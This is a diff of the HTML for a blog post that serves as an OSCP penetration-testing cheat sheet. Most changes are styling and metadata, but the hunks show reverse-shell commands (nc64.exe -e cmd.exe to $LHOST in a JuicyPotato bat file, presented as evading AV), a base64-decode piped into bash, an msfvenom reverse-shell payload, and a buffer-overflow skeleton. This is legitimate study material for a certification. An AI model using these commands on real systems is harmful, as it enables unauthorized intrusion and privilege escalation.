@@ -12,7 +12,7 @@ That being said - it is far from an exhaustive list.">
 <meta name=theme-color content>
 <link rel=canonical href=https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/>
 <title>
-OSCP Cheat Sheet and Command Reference :: Cas van Cooten — I ramble about security stuff, mostly
+OSCP Cheat Sheet and Command Reference :: Cas' Security Ramblings
 </title>
 <link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
 <link rel=stylesheet href=/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css>
@@ -27,7 +27,7 @@ OSCP Cheat Sheet and Command Reference :: Cas van Cooten — I ramble about secu
 <meta itemprop=description content="Updated May 18th, 2020
 Since my OSCP certification exam is coming up, I decided to do a writeup of the commands and techniques I have most frequently used in the PWK labs and in similar machines. I aimed for it to be a basic command reference, but in writing it it has grown out to be a bit more than that!
 That being said - it is far from an exhaustive list."><meta itemprop=datePublished content="2020-05-03T00:00:00+00:00">
-<meta itemprop=dateModified content="2020-05-03T00:00:00+00:00">
+<meta itemprop=dateModified content="2022-02-22T20:09:33+00:00">
 <meta itemprop=wordCount content="3778"><meta itemprop=image content="https://casvancooten.com/preview.png">
 <meta itemprop=keywords content="PWK,OSCP,Hacking,">
 <meta name=twitter:card content="summary_large_image">
@@ -43,7 +43,7 @@ That being said - it is far from an exhaustive list.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/"><meta property="og:image" content="https://casvancooten.com/preview.png"><meta property="article:section" content="posts">
 <meta property="article:published_time" content="2020-05-03T00:00:00+00:00">
-<meta property="article:modified_time" content="2020-05-03T00:00:00+00:00"><meta property="og:site_name" content="Cas van Cooten">
+<meta property="article:modified_time" content="2022-02-22T20:09:33+00:00">
 <meta property="og:see_also" content="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/">
 <meta property="article:published_time" content="2020-05-03 00:00:00 +0000 UTC">
 </head>
@@ -66,6 +66,7 @@ That being said - it is far from an exhaustive list.">
 </nav>
 <span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
 </span>
+<span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span>
 </span>
 </span>
 </header>
@@ -170,7 +171,7 @@ That being said - it is far from an exhaustive list.">
 </blockquote>
 <h3 id=smtp-25tcp>SMTP (25/tcp)</h3>
 <p>You may be able to enumerate usernames through SMTP.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>nc 10.11.1.217 25
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>nc 10.11.1.217 25
 [...]
 VRFY root
 252 2.0.0 root
@@ -268,8 +269,8 @@ Most hashes I encountered during my time in the PWK labs are unsalted (MD5 or (N
 <h4 id=juicypotato>JuicyPotato</h4>
 <p>Relevant if you have the <code>SeImpersonatePrivilege</code> and the OS version is <em>older than</em> Server 2019 or Windows 10. I&rsquo;ve had the biggest successes by using a neutral binary such as <code>nc.exe</code> or <code>nc64.exe</code> from <a href=https://eternallybored.org/misc/netcat/>here</a>. If you create a <code>bat</code> file with the command call, it should evade most AV and give you a privileged shell.</p>
 <p>Grab a CLSID from <a href=https://ohpe.it/juicy-potato/CLSID/>here</a>, it may take a couple of different attempts to get a working CLSID.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># On target system, after copying required binaries
-<span style=color:#66d9ef>echo</span> C:\temp\nc64.exe -e cmd.exe $LHOST 443 &gt; rev.bat
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># On target system, after copying required binaries
+<span style=color:#6ab825;font-weight:700>echo</span> C:\temp\nc64.exe -e cmd.exe $LHOST 443 &gt; rev.bat
 .\JuicyPotato.exe -l 1337 -p C:\temp\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 </code></pre></div><blockquote>
 <p>Alternatives to the above are available. Play with tools like <a href=https://github.com/TsukiCTF/Lovely-Potato>LovelyPotato</a> as well, which automate the finding of the CLSID.</p>
@@ -278,7 +279,7 @@ Most hashes I encountered during my time in the PWK labs are unsalted (MD5 or (N
 <p>Relevant if you are a local administrator, but <code>whoami /all</code> returns that you are running in a &ldquo;Medium integrity process&rdquo;. The method of exploitation differs widely per OS version. Googling for automated UAC bypass exploits for a specific version, or using <a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>Windows-Exploit-Suggester</a> or metasploit to ID possible UAC bypass vulnerabilities is likely to have success.</p>
 <h4 id=local-admin-to-system>Local Admin to SYSTEM</h4>
 <p>Even though this is strictly not required for PWK or the OSCP certification exam, I always like to get a full <code>SYSTEM</code> shell. We can realize this with <code>PsExec.exe</code> (from <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>here</a>). You can use a Msfvenom executable instead of <code>rev.bat</code>, but the latter works better for AV evasion (see <code>JuicyPotato</code>).</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>.\PsExec.exe -i -s &#34;c:\temp\rev.bat&#34;
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>.\PsExec.exe -i -s &#34;c:\temp\rev.bat&#34;
 </code></pre></div><blockquote>
 <p>If you have a shell on a Windows system and a password for another user, PsExec can also be used to execute programs as the target user.</p>
 <pre tabindex=0><code>.\PsExec.exe -user $USERNAME -p $PASSWORD &quot;c:\temp\rev.bat&quot;
@@ -315,40 +316,40 @@ Most hashes I encountered during my time in the PWK labs are unsalted (MD5 or (N
 <ol>
 <li>
 <p>Impacket-smbserver</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure .
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure .
 
-<span style=color:#75715e># On target system - copy files</span>
-copy <span style=color:#ae81ff>\\</span>$LHOST<span style=color:#ae81ff>\s</span>ecure<span style=color:#ae81ff>\n</span>c64.exe .
+<span style=color:#999;font-style:italic># On target system - copy files</span>
+copy <span style=color:#ed9d13>\\</span><span style=color:#40ffff>$LHOST</span><span style=color:#ed9d13>\s</span>ecure<span style=color:#ed9d13>\n</span>c64.exe .
 </code></pre></div><p>`</p>
 </li>
 <li>
 <p>Impacket-smbserver (with SMBv2 support)
 Seems to work in some cases, if you get a &ldquo;not subscriptable&rdquo; error otherwise.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure . -smb2support
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure . -smb2support
 
-<span style=color:#75715e># On target system - spawn shell straight from share</span>
-<span style=color:#ae81ff>\\</span>$LHOST<span style=color:#ae81ff>\s</span>ecure<span style=color:#ae81ff>\n</span>c64.exe $LHOST $LPORT -e cmd.exe
+<span style=color:#999;font-style:italic># On target system - spawn shell straight from share</span>
+<span style=color:#ed9d13>\\</span><span style=color:#40ffff>$LHOST</span><span style=color:#ed9d13>\s</span>ecure<span style=color:#ed9d13>\n</span>c64.exe <span style=color:#40ffff>$LHOST</span> <span style=color:#40ffff>$LPORT</span> -e cmd.exe
 </code></pre></div><p>`</p>
 </li>
 <li>
 <p>SMB Daemon
 Works most of the time, but is some hassle to set up and doesn&rsquo;t give you NetNTLM hashes as a bonus.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>service smbd start
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>service smbd start
 </code></pre></div><p>`</p>
 </li>
 </ol>
 <h3 id=linux-1>Linux</h3>
 <p>I usually use a simple HTTP server from python to <code>curl</code> or <code>wget</code> files on demand.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server <span style=color:#ae81ff>80</span> <span style=color:#75715e># Starts a web server in the current directory on port 80</span>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server <span style=color:#3677a9>80</span> <span style=color:#999;font-style:italic># Starts a web server in the current directory on port 80</span>
 </code></pre></div><p>There are some nice alternatives in case this is not possible. Examples are base64-encoding and netcat.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat $FILENAME | base64 <span style=color:#75715e>#copy output</span>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat <span style=color:#40ffff>$FILENAME</span> | base64 <span style=color:#999;font-style:italic>#copy output</span>
 
-<span style=color:#75715e># On target</span>
-echo -n <span style=color:#e6db74>&#34;</span>$BASE64FILE<span style=color:#e6db74>&#34;</span> | base64 -d | bash <span style=color:#75715e># run the file in bash</span>
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvnp <span style=color:#ae81ff>443</span> &lt; $FILENAME
+<span style=color:#999;font-style:italic># On target</span>
+<span style=color:#24909d>echo</span> -n <span style=color:#ed9d13>&#34;</span><span style=color:#40ffff>$BASE64FILE</span><span style=color:#ed9d13>&#34;</span> | base64 -d | bash <span style=color:#999;font-style:italic># run the file in bash</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvnp <span style=color:#3677a9>443</span> &lt; <span style=color:#40ffff>$FILENAME</span>
 
-<span style=color:#75715e># On target</span>
-nc $LHOST <span style=color:#ae81ff>443</span> &gt; $FILENAME
+<span style=color:#999;font-style:italic># On target</span>
+nc <span style=color:#40ffff>$LHOST</span> <span style=color:#3677a9>443</span> &gt; <span style=color:#40ffff>$FILENAME</span>
 </code></pre></div><h2 id=pivoting>Pivoting</h2>
 <p>SSH access always gives you the easiest pivot. You can set up a SOCKS proxy by adding the <code>-D</code> flag as follows.</p>
 <pre tabindex=0><code>ssh $USERNAME@$RHOST -D 1080
@@ -412,16 +413,16 @@ On target:</p>
 </blockquote>
 <p>Addresses in little endian format, so address <code>0xabcdef10</code> becomes <code>\x10\xef\xcd\xab</code>.</p>
 <h3 id=generate-shellcode>Generate shellcode</h3>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p windows/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>$LHOST LPORT<span style=color:#f92672>=</span>$LPORT EXITFUNC<span style=color:#f92672>=</span>thread -f py -b <span style=color:#e6db74>&#39;\x00&#39;</span>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p windows/shell_reverse_tcp <span style=color:#40ffff>LHOST</span>=<span style=color:#40ffff>$LHOST</span> <span style=color:#40ffff>LPORT</span>=<span style=color:#40ffff>$LPORT</span> <span style=color:#40ffff>EXITFUNC</span>=thread -f py -b <span style=color:#ed9d13>&#39;\x00&#39;</span>
 </code></pre></div><h3 id=add-nop-sled>Add NOP sled</h3>
 <p>Just to ensure the payload is referenced correctly.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>nopsled <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>nopsled = <span style=color:#ed9d13>&#39;</span><span style=color:#ed9d13>\x90</span><span style=color:#ed9d13>&#39;</span> * <span style=color:#3677a9>16</span>
 </code></pre></div><h3 id=finalize-exploit>Finalize exploit</h3>
 <p>At a high level, your buffer becomes something like the following for a simple BoF.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>buffer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1337</span> <span style=color:#75715e># Identified overflow offset</span>
-buffer <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x10\xef\xcd\xab</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># EIP, pointing to your chosen instruction (e.g. JMP ESP)</span>
-buffer <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span> <span style=color:#75715e># NOP sled</span>
-buffer <span style=color:#f92672>+=</span> exploit_code
+<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>buffer = <span style=color:#ed9d13>&#34;A&#34;</span> * <span style=color:#3677a9>1337</span> <span style=color:#999;font-style:italic># Identified overflow offset</span>
+buffer += <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\x10\xef\xcd\xab</span><span style=color:#ed9d13>&#34;</span> <span style=color:#999;font-style:italic># EIP, pointing to your chosen instruction (e.g. JMP ESP)</span>
+buffer += <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\x90</span><span style=color:#ed9d13>&#34;</span> * <span style=color:#3677a9>16</span> <span style=color:#999;font-style:italic># NOP sled</span>
+buffer += exploit_code
 </code></pre></div>
 </div>
 </article>
@@ -437,13 +438,14 @@ buffer <span style=color:#f92672>+=</span> exploit_code
 </p>
 <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
 03-05-2020
+(Last updated: 22-02-2022)
+</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"/><line x1="1.05" y1="12" x2="7" y2="12"/><line x1="17.01" y1="12" x2="22.96" y2="12"/></svg>
+<a href=7cbc6db5d409b09dcd74dafef99c2761d5bb7cdb target=_blank rel=noopener>7cbc6db</a>
+@ 22-02-2022
 </p>
 </div>
 <div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Read other posts</span>
-<hr>
-</div>
 <div class=pagination__buttons>
 <span class="button previous">
 <a href=https://casvancooten.com/posts/2020/05/generating-pretty-pwk-reports-with-pandoc-and-markdown-templates-inside/>
@@ -456,6 +458,18 @@ buffer <span style=color:#f92672>+=</span> exploit_code
 </main>
 </div>
 <footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span><a href=https://casvancooten.com></a></span>
+<span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span>
+<span><a href=https://casvancooten.com/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<span><a href=http://gohugo.io>Hugo</a> theme by <a href=https://github.com/rhazdon>rhazdon</a></span>
+</div>
+</div>
 </footer>
 </div>
 <script type=text/javascript src=/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
